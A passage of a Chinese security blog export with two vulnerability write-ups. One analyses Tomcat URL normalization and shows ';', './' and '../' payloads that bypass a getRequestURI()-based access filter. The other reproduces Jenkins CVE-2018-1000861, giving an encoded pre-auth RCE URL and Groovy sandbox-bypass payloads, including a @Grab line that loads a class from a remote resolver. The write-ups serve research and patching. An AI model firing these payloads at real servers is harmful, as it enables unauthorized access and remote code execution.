<h3 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h3><p>新建一个Java Web项目，index.jsp如下：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h4 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h4><p>Tomcat运行之后，正常访问<code>http://localhost:8080/urltest/index.jsp</code>，页面输出如下：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/1.png" alt=""></p>
<h4 id="插入-访问"><a href="#插入-访问" class="headerlink" title="插入 ./ 访问"></a>插入 ./ 访问</h4><p>尝试插入多个<code>./</code>访问即<code>http://localhost:8080/urltest/./././index.jsp</code>，页面输出如下：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/2.png" alt=""></p>
<p>可以看到，插入多个<code>./</code>也能正常访问。</p>
<p>接着尝试这种形式<code>http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp</code>，发现是返回404，未找到该资源访问：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/3.png" alt=""></p>
<h4 id="插入-访问-1"><a href="#插入-访问-1" class="headerlink" title="插入 ../ 访问"></a>插入 ../ 访问</h4><p>尝试插入<code>../</code>访问即<code>http://localhost:8080/urltest/../index.jsp</code>，页面输出如下：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/4.png" alt=""></p>
<p>可以是返回的404，这是因为实际访问的是<code>http://localhost:8080/index.jsp</code>，这个目录文件当然不存在。</p>
<p>换种跨目录的形式就OK了<code>http://localhost:8080/urltest/noexist/../index.jsp</code>：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/5.png" alt=""></p>
<h4 id="插入-访问-2"><a href="#插入-访问-2" class="headerlink" title="插入 ;/ 访问"></a>插入 ;/ 访问</h4><p>尝试插入多个<code>;/</code>访问即<code>http://localhost:8080/urltest/;/;/;/index.jsp</code>，页面输出如下：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/6.png" alt=""></p>
<p>可以看到，插入多个<code>;</code>也能正常访问。</p>
<p>在<code>;</code>号后面加上字符串也是能正常访问的，如<code>http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp</code>：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/7.png" alt=""></p>
<h4 id="插入其他特殊字符访问"><a href="#插入其他特殊字符访问" class="headerlink" title="插入其他特殊字符访问"></a>插入其他特殊字符访问</h4><p>尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &apos; &quot; &lt; &gt; ?</span><br></pre></td></tr></table></figure>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>由前面的尝试知道，Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。</p>
<h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。</p>
<h3 id="Tomcat对URL特殊字符的处理"><a href="#Tomcat对URL特殊字符的处理" class="headerlink" title="Tomcat对URL特殊字符的处理"></a>Tomcat对URL特殊字符的处理</h3><p>这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。</p>
<p>经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service:452, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:1195, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure>
<p>在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/8.png" alt=""></p>
<p>跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/9.png" alt=""></p>
<p>这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在<code>;</code>号，找到的话才会进入下面的if代码逻辑：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/10.png" alt=""></p>
<p>如果找到了<code>;</code>号，在if代码逻辑中后面的循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问<code>http://localhost:8080/urltest/;mi1k7ea/index.jsp</code>再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是<code>;</code>，47是<code>/</code>）：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/11.png" alt=""></p>
<p>由此可知，parsePathParameters()函数是对<code>;xxx/</code>这种形式进行处理的。</p>
<p>接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。</p>
<p>先看到这段代码，ASCII码92表示<code>\</code>，当匹配到时将其替换为ASCII码为47的<code>/</code>；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/12.png" alt=""></p>
<p>往下是这段循环，判断是否有连续的<code>/</code>，存在的话则循环删除掉多余的<code>/</code>：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/13.png" alt=""></p>
<p>接着往下看，这段循环就是对<code>./</code>和<code>../</code>这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/14.png" alt=""></p>
<p>这里尝试下添加<code>/./</code>访问的处理，看到找到之后是直接将其去掉然后继续放行：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/15.png" alt=""></p>
<p>这里尝试下添加<code>/../</code>访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/16.png" alt=""></p>
<p>由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过<code>;xxx/</code>的URL请求内容进标准化处理，具体为将连续的多个<code>/</code>给删除掉只保留一个、将<code>/./</code>删除掉、将<code>/../</code>进行跨目录拼接处理，最后返回处理后的URL路径。</p>
<p><strong>结论</strong></p>
<p>Tomcat对<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理。</p>
<h3 id="getRequestURI-的处理"><a href="#getRequestURI-的处理" class="headerlink" title="getRequestURI()的处理"></a>getRequestURI()的处理</h3><p>我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。</p>
<p>这里是直接调用Request.requestURI()函数然后直接返回其字符串值：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/19.png" alt=""></p>
<p>跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/20.png" alt=""></p>
<h3 id="getRequestURL-的处理"><a href="#getRequestURL-的处理" class="headerlink" title="getRequestURL()的处理"></a>getRequestURL()的处理</h3><p>在getRequestURL()函数中是调用了Request.getRequestURL()函数的：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/24.png" alt=""></p>
<p>跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/25.png" alt=""></p>
<h3 id="getServletPath-的处理"><a href="#getServletPath-的处理" class="headerlink" title="getServletPath()的处理"></a>getServletPath()的处理</h3><p>在getServletPath()函数中是调用了Request.getServletPath()函数的：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/21.png" alt=""></p>
<p>跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/22.png" alt=""></p>
<h3 id="getPathInfo-的处理"><a href="#getPathInfo-的处理" class="headerlink" title="getPathInfo()的处理"></a>getPathInfo()的处理</h3><p>和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/23.png" alt=""></p>
<h3 id="getContextPath-的处理"><a href="#getContextPath-的处理" class="headerlink" title="getContextPath()的处理"></a>getContextPath()的处理</h3><p>在getContextPath()函数中，调用了Request.getContextPath()函数：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/26.png" alt=""></p>
<p>跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/27.png" alt=""></p>
<p>往下的这段循环是处理uri变量值中如果存在多个连续的<code>/</code>则删除掉：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/28.png" alt=""></p>
<p>再往下，获取下一个<code>/</code>符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/29.png" alt=""></p>
<p>接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理<code>;</code>和<code>.</code>，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/30.png" alt=""></p>
<p>最后，直接返回按pos索引切分的uri变量值：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/31.png" alt=""></p>
<h2 id="0x04-攻击利用"><a href="#0x04-攻击利用" class="headerlink" title="0x04 攻击利用"></a>0x04 攻击利用</h2><p>看个访问限制绕过的场景。</p>
<p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">username: mi1k7ea&lt;br&gt;</span><br><span class="line">password: <span class="number">123456</span>&lt;br&gt;</span><br><span class="line">address: china&lt;br&gt;</span><br><span class="line">phone: <span class="number">13666666666</span>&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p>
<p>编辑web.xml，添加testFilter设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.testFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/17.png" alt=""></p>
<p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/urltest/./info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/18.png" alt=""></p>
<p>整个的过程大致如此，就是利用解析的差异性来绕过认证。</p>
<p>在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">getRequestURI()带来的安全问题</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>（先知首发）从Jenkins RCE看Groovy代码注入</title>
    <url>/2020/09/05/%E4%BB%8EJenkins-RCE%E7%9C%8BGroovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/8231" target="_blank" rel="noopener">https://xz.aliyun.com/t/8231</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看了下Jenkins相关漏洞，实在是太膜拜Orange大佬的挖掘思路了！！！分析下之后发现不会Groovy，在学习借鉴Me7ell大佬分享的Groovy文章下，于是就整理出本篇文章。</p>
<h2 id="0x01-从Jenkins-RCE看起（CVE-2018-1000861）"><a href="#0x01-从Jenkins-RCE看起（CVE-2018-1000861）" class="headerlink" title="0x01 从Jenkins RCE看起（CVE-2018-1000861）"></a>0x01 从Jenkins RCE看起（CVE-2018-1000861）</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Jenkins是一个独立的开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。前身是Hudson是一个可扩展的持续集成引擎。可用于自动化各种任务，如构建，测试和部署软件。</p>
<p>Jenkins Pipeline是一套插件，支持将连续输送Pipeline实施和整合到Jenkins。Pipeline提供了一组可扩展的工具，用于通过PipelineDSL为代码创建简单到复杂的传送Pipeline。 </p>
<p>Jenkins远程代码执行漏洞（CVE-2018-1000861），简单地说，就是利用Jenkins动态路由机制的缺陷来绕过ACL的限制，结合绕过Groovy沙箱的Groovy代码注入来实现无验证RCE的攻击利用。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接用的Vulhub的环境：<a href="https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/</a></p>
<p>PoC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0d%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0d%0a%20%20%20%20%22%74%6f%75%63%68%20%2f%74%6d%70%2f%6d%69%31%6b%37%65%61%22%2e%65%78%65%63%75%74%65%28%29%0d%0a%20%20%7d%0d%0a%7d</span><br></pre></td></tr></table></figure>
<p>其中URL编码部分为：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">x</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span> x()&#123;</span><br><span class="line">    <span class="string">"touch /tmp/mi1k7ea"</span>.execute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除此之外，还有其他类型的PoC：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123; <span class="string">"touch /tmp/mi1k7ea"</span>.execute() &#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br><span class="line">或</span><br><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;<span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">"touch /tmp/mi1k7ea"</span>)&#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br><span class="line">或</span><br><span class="line"><span class="meta">@GrabConfig</span>(disableChecksums=<span class="literal">true</span>)</span><br><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">'Exp'</span>, root=<span class="string">'http://127.0.0.1:8000/'</span>)</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">'test'</span>, module=<span class="string">'poc'</span>, version=<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">import</span> Exp;</span><br></pre></td></tr></table></figure>
<p>无需登录认证发起攻击：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/10.png" alt=""></p>
<p>成功RCE：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/11.png" alt=""></p>
<h3 id="漏洞原理简析"><a href="#漏洞原理简析" class="headerlink" title="漏洞原理简析"></a>漏洞原理简析</h3><p>网上很多文章包括Orange大佬的博客都讲解得很详细了，这里只是简单提下关键点。</p>
<h4 id="Jenkins动态路由机制"><a href="#Jenkins动态路由机制" class="headerlink" title="Jenkins动态路由机制"></a>Jenkins动态路由机制</h4><p>Jenkins是基于Stapler框架开发的，在web.xml中可以看到Jenkins是将所有的请求交给<code>org.kohsuke.stapler.Stapler</code>来进行处理的，而Stapler是使用一套Naming Convention来实现动态路由的。该动态路由机制是先以<code>/</code>作为分隔符将URL切分，然后以<code>jenkins.model.Jenkins</code>作为入口点开始往下遍历，如果URL切分部分满足以下条件则继续往下调用：</p>
<ol>
<li>Public属性的成员变量；</li>
<li>Public属性的方法，主要是getter方法，具体如下：</li>
</ol>
<ul>
<li><code>get&lt;token&gt;()</code></li>
<li><code>get&lt;token&gt;(String)</code></li>
<li><code>get&lt;token&gt;(Int)</code></li>
<li><code>get&lt;token&gt;(Long)</code></li>
<li><code>get&lt;token&gt;(StaplerRequest)</code></li>
<li><code>getDynamic(String, …)</code></li>
<li><code>doDynamic(…)</code></li>
<li><code>do&lt;token&gt;(…)</code></li>
<li><code>js&lt;token&gt;(…)</code></li>
<li><code>Class method with @WebMethod annotation</code></li>
<li><code>Class method with @JavaScriptMethod annotation</code></li>
</ul>
<p>简单地说，<strong>Jenkins动态路由机制在解析URL的时候会调用相关类的getter方法</strong>。</p>
<h4 id="Jenkins白名单路由"><a href="#Jenkins白名单路由" class="headerlink" title="Jenkins白名单路由"></a>Jenkins白名单路由</h4><p>Jenkins动态路由主要调用的是<code>org.kohsuke.stapler.Stapler#tryInvoke()</code>方法，该方法会对除了boundObjectTable外所有node都会进行一次权限检查，具体实现在<code>jenkins.model.Jenkins#getTarget()</code>中，这其中实际就是一个URL前缀白名单检查：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ImmutableSet&lt;String&gt; ALWAYS_READABLE_PATHS = ImmutableSet.of(</span><br><span class="line">    <span class="string">"/login"</span>,</span><br><span class="line">    <span class="string">"/logout"</span>,</span><br><span class="line">    <span class="string">"/accessDenied"</span>,</span><br><span class="line">    <span class="string">"/adjuncts/"</span>,</span><br><span class="line">    <span class="string">"/error"</span>,</span><br><span class="line">    <span class="string">"/oops"</span>,</span><br><span class="line">    <span class="string">"/signup"</span>,</span><br><span class="line">    <span class="string">"/tcpSlaveAgentListener"</span>,</span><br><span class="line">    <span class="string">"/federatedLoginService/"</span>,</span><br><span class="line">    <span class="string">"/securityRealm"</span>,</span><br><span class="line">    <span class="string">"/instance-identity"</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>因此，绕过ACL的关键在于，要在上述白名单的一个入口点中找到其他对象的Reference（引用），来跳到非白名单成员从而实现绕过白名单URL前缀的限制。</p>
<h4 id="通过对象间的Reference绕过ACL"><a href="#通过对象间的Reference绕过ACL" class="headerlink" title="通过对象间的Reference绕过ACL"></a>通过对象间的Reference绕过ACL</h4><p>如上所述，关键在于找到一个Reference作为跳板来绕过，Orange给出了如下跳板：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/securityRealm/user/[username]/descriptorByName/[descriptor_name]/</span><br></pre></td></tr></table></figure>
<p>该跳板在动态路由中会依次执行如下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jenkins.model.Jenkins.getSecurityRealm()</span><br><span class="line">.getUser([username])</span><br><span class="line">.getDescriptorByName([descriptor_name])</span><br></pre></td></tr></table></figure>
<p>这是因为在Jenkins中，每个对象都是继承于<code>hudson.model.Descriptor</code>类，而继承该类的对象可以通过调用<code>hudson.model.DescriptorByNameOwner#getDescriptorByName(String)</code>方法来进行调用。</p>
<h4 id="RCE-Gadget"><a href="#RCE-Gadget" class="headerlink" title="RCE Gadget"></a>RCE Gadget</h4><p>Orange给出了好几条可结合利用的漏洞利用链，其中之最当然是RCE的Gadget。</p>
<p>前面简介中提到了Jenkins Pipeline，它其实就是基于Groovy实现的一个DSL，可使开发者十分方便地去编写一些Build Script来完成自动化的编译、测试和发布。</p>
<p>在Jenkins中，大致使用如下代码来检测Groovy的语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSON <span class="title">doCheckScriptCompile</span><span class="params">(@QueryParameter String value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        CpsGroovyShell trusted = <span class="keyword">new</span> CpsGroovyShellFactory(<span class="keyword">null</span>).forTrusted().build();</span><br><span class="line">        <span class="keyword">new</span> CpsGroovyShellFactory(<span class="keyword">null</span>).withParent(trusted).build().getClassLoader().parseClass(value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CompilationFailedException x) &#123;</span><br><span class="line">        <span class="keyword">return</span> JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON();</span><br><span class="line">    <span class="comment">// Approval requirements are managed by regular stapler form validation (via doCheckScript)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键就是<code>GroovyClassLoader.parseClass()</code>，该方法只是进行AST解析但并未执行Groovy语句，即实际并没有execute()方法调用，而且真正执行Groovy代码时会遇到Groovy沙箱的限制。</p>
<p>如何解决这个问题来绕过Groovy沙箱呢？Orange给出了答案——借助编译时期的Meta Programming，其中提到了两种方法。</p>
<h5 id="利用-ASTTest执行断言"><a href="#利用-ASTTest执行断言" class="headerlink" title="利用@ASTTest执行断言"></a>利用@ASTTest执行断言</h5><p>根据Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，发现可利用<a href="mailto:`@groovy.transform.ASTTest" target="_blank" rel="noopener">`@groovy.transform.ASTTest</a>`注解来实现在AST上执行一个断言。例如：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123; <span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">"calc"</span>) &#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>但在远程利用上会报错，原因在于Pipeline Shared Groovy Libraries Plugin这个插件，主要用于在PipeLine中引入自定义的函式库。Jenkins会在所有PipeLine执行前引入这个插件，而在编译阶段的ClassPath中并没有对应的函式库从而导致报错。</p>
<p>直接删掉这个插件是可以成功利用的，但由于该插件是随PipeLine默认安装的、因此这不是最优解。</p>
<h5 id="利用-Grab远程加载恶意类"><a href="#利用-Grab远程加载恶意类" class="headerlink" title="利用@Grab远程加载恶意类"></a>利用@Grab远程加载恶意类</h5><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。例如：</p>
